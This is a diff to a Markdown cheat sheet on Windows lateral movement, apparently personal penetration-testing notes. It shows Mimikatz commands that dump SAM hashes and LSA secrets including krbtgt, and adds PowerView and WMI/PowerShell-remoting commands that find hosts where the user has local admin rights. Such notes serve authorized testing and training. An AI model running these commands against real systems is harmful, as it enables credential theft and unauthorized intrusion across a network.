@@ -1,7 +1,7 @@
 # Lateral Movement
-* [General](#General) 
-* [Evasion](#Evasion) 
+* [General](#General)
 * [Mimikatz](#Mimikatz) 
+* [Check Local Admin Access](#Check-Local-Admin-Access)  
 
 ## General
 #### Connect to machine with administrator privs
@@ -64,4 +64,21 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 #### Mimikatz dump lsa (krbtgt to)
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+## Check Local Admin Access
+#### Powerview
+```
+Find-LocalAdminAccess -Verbose
+```
+
+### Other scripts
+```
+. ./Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess
+```
+
+```
+. ./Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
 ```
